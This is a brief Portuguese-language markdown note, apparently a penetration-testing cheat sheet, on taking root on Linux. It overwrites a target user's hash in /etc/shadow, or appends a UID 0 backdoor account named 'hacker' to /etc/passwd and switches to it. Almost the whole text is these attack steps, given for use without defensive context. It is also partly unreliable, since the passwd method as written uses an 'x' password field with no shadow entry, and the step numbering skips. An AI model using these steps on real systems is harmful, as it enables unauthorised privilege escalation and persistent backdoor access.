# Senhas
No arquivo ``/etc/passwd`` ou ``/etc/shadow`` ficam armazenadas as senhas no linux.

## passo a passo
### shadow
1. Gere um novo hash de senha: ``openssl passwd -6 "nova_senha"``
2. Edite o ``/etc/shadow`` e substitua a linha do usuário alvo ``root:$6$randomsalt$hFj...mYQd/:19472:0:99999:7:::``
3. Acesse ``su root``

### passwd
1. Adicione uma linha ao final do arquivo `/etc/passwd`: ``hacker:x:0:0:Hacker:/root:/bin/bash``
Explicação dos campos:
- `hacker` → Nome do usuário
- `x` → Indica que a senha está em `/etc/shadow`
- `0:0` → UID e GID do root (dá privilégios totais)
- ``:Hacker:``: informações do usuário, um campo de comentário usado pelo comando finger
- `/root` → Diretório home
- `/bin/bash` → Shell do usuário

3. ``su hacker``


